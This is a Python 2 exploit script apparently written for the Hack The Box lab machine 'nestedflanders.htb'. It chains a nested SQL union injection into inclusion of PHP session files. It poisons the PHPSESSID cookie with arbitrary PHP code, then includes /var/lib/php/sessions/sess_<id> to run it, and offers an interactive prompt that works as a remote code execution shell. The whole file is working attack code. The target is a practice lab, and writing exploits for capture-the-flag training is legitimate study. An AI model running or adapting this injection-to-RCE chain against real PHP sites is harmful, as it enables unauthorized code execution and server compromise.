#!/usr/bin/python2
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
import readline
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# We get response this way, reading sessid file in /var/lib/php/sessions/
def respo(path, sessid):

    target = "https://www.nestedflanders.htb/index.php?id=25'+union+select+\"contact+'union+select+" + "'" + path + "/sess_" + sessid + "'" + "--+-\"+--+-"
    req = requests.get(target,verify=False)
    print '* Going though ' + req.url + ' ...\n'
    response0 = req.text

    startpoint = response0.index("<!-- <div align=\"center\"> -->")
    endpoint = response0.index("<!-- </div> -->")
    print "\n"
    print "Injected, and here's the \n"
    print "*** Response: \n"
    print response0[startpoint+29:endpoint]


# Firstly, let the script build required payload to execute
# We replace PHPSESSID with the code we need. After this we should get a new PHPSESSID - which will be used to read the result and, maybe, execute the code
def rce(path, phpcode):
    target = "https://www.nestedflanders.htb/index.php?id=25'+union+select+\"contact+'union+select+" + "'" + path + "'" + "--+-\"+--+-"

    payload = urllib.quote(phpcode)
    headers = {'Cookie': "PHPSESSID=" + payload}

    print "Injecting php code ...\n(" + phpcode + ")\n"
    req = requests.get(target,verify=False,headers=headers)

    #print req.headers['Set-Cookie']
    #print req.headers['Set-Cookie'][5:]

    cookie = req.headers['Set-Cookie']
    print cookie
    result_cookie = ''

    infrom = cookie.index("; path=/")

    to = infrom + 8

    str = list(cookie)

    for i in range(infrom, to):
        str[i] = ''
        result_cookie = ''.join(str);

    str = list(result_cookie)

    for i in range(0,10):
        str[i] = ''
        result_cookie = ''.join(str)

    print "* Sessid:",result_cookie
    respo("/var/lib/php/sessions", result_cookie);

def main():
    command = ''
    while True:
        command = raw_input('PHP: ')

        if len(command) != 0:
            rce("", command)

if __name__ == '__main__':
    main()
